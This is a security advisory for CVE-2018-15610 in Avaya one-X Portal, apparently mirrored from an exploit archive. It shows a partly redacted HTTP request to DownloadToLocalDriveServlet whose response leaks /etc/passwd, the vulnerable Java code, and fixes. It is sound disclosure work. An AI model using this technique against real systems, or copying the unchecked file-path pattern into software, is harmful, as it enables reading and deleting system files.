@@ -1,0 +1,147 @@
+id: 31070
+date: 09/11/2018
+title: Avaya one-X 9.x / 10.0.x / 10.1.x Arbitrary File Disclosure / Deletion Vulnerabilities
+author: Pedro Andujar
+cves: CVE-2018-15610
+
+Tittle:   one-X portal arbitrary OS file access
+    Risk:   High
+    Date:   07.Ago.2018
+  Author:   Pedro Andujar
+ Twitter:   @pandujar
+
+
+           
+.: [ INTRO ] :
+
+one-X Portal for IP Office is an application that runs on a web server connected to the IP Office telephone system. Using a web browser, one can access 
+the one-X Portal for IP Office and use it to perform actions such as:
+
+* Control your telephone calls.
+* View details of calls and directories of contacts.
+* Configure settings that affect how your calls are treated by the telephone system.
+* Conference calls.
+* Manage your voicemail messages.
+
+
+
+.: [ TECHNICAL DESCRIPTION ] :.
+
+Avaya one-x for ip office contains a default low privileged account, which has limited access to the application, where it's intended to perform backup duties.
+
+An arbitrary file download issue was found in the backup portal, affecting to either Linux and Windows versions of the 9.x, 10.0.x and 10.1.x series. An 
+authenticated remote attacker could send specially crafted request leading into potential information disclosure and DoS. 
+
+
+
+.: [ ISSUE #1 ]:.
+
+Name: Arbitrary OS file download/deletion
+Severity: High
+CVE: CVE-2018-15610
+
+DownloadToLocalDriveServlet allows to download any operating system file.
+
+<<<REQUEST>>>
+GET /path/to/DownloadToLocalDriveServlet**REDACTED** HTTP/1.1
+Host: 192.168.1.38
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://192.168.1.38/onexportal-afa.html
+Cookie: JSESSIONID=740B74DC4B77E0B8EB8F4FED6BA5EAE8;
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+<<<RESPONSE>>>
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Content-Disposition: attachment; filename=passwd;
+Content-Type: application/zip
+Date: Mon, 19 Mar 2018 20:38:39 GMT
+Connection: close
+Content-Length: 1910
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+....
+
+This request also deletes de file after being downloaded (depending on the OS file and process permissions). Be carefull on Windows version as process runs with 
+system privileges.
+
+Vulnerable piece of code:
+
+    if (sessionManager.isSessionAlive(session)) {
+      String folder = req.getParameter("folder");
+      String filename = req.getParameter("filename");
+      if (logger.isDebugEnabled()) logger.debug(new Object[] { "doGet(), folder:", Helper.reformatFolderPath(folder), ", filename: ", filename });
+      BufferedOutputStream bos = null;
+      FileInputStream in = null;
+      try {
+        resp.setContentType("application/zip");
+        resp.setHeader("Content-Disposition", "attachment; filename=" + filename + ";");
+        bos = new BufferedOutputStream(resp.getOutputStream());
+        in = new FileInputStream(Helper.reformatFolderPath(folder) + filename)
+
+
+
+.: [ CHANGELOG ] :.
+
+  * 18/Mar/2018:   - Vuln discovered during pentest engagement.
+  * 19/Mar/2018:   - Avaya product security contacted. 
+  * 19/Mar/2018:   - Avaya product security replied. 
+  * 23/Mar/2018:   - Avaya product security confirmed and planned fix. 
+  * 23/Jul/2018:   - Fix available to customers.
+  * 31/Ago/2018:   - Public disclosure.
+
+(Kudos to the ProducSec Team, for the excelent communication and incident handling)
+
+
+
+.: [ SOLUTIONS ] :.
+
+- DownloadToLocalDriveServlet it is only intended to download backup zip files from server to the desktop. Backup file default folder it's predefined setting that 
+appears as serverFolderForBackup directive on $TOMCAT\bin\inyama-user.xml file, and therefore do not need to be passed through GET parameter. 
+
+String serverFolder = loggedInUser.getServerFolder() + File.separator;
+File downloadedFile = new File(Helper.reformatFolderPath(serverFolder), fileName);
+
+- Implement file type checks and enforce/append .zip extension (this is also recomended for UploadFromLocalServlet.class which allows arbitrary file upload, 
+but at least enforces destination folder).
+
+- Avoid sending filename as GET or ensure path traversal protection is in place.
+
+
+https://downloads.avaya.com/css/P8/documents/101051984
+
+For 10.0.x, upgrade to IP Office one-X portal 10.0.702.16.
+For 10.1.x, upgrade to IP Office one-X portal 10.1.300.12.
+Fix is also provided in 11.0 or later.
+
+Avaya strongly recommends following networking and security best practices by implementing firewalls, ACLs, physical security or other appropriate access 
+restrictions. Though Avaya believes such restrictions should always be in place, risk to Avaya products and the surrounding network from this potential 
+vulnerability may be mitigated by ensuring these practices are implemented until such time as an Avaya provided product update or the recommended Avaya 
+action is applied. Further restrictions as deemed necessary based on the customer's security policies may be required during this interim period, but the 
+System Product operating system or application should not be modified unless the change is approved by Avaya. Making changes that are not approved may void 
+the Avaya product service contract.
+
+
+
+.: [ REFERENCES ] :.
+
+   [+] Installing Avaya one-XA(r) Portal for IP OfficeaC/ Platform
+    https://downloads.avaya.com/css/P8/documents/101028405
+
+   [+] Avaya Product Security
+    https://support.avaya.com/security
+
+   [+] Cobalt.io
+    https://app.cobalt.io/researchers
+
+
+#  0day.today [2023-03-25]  #
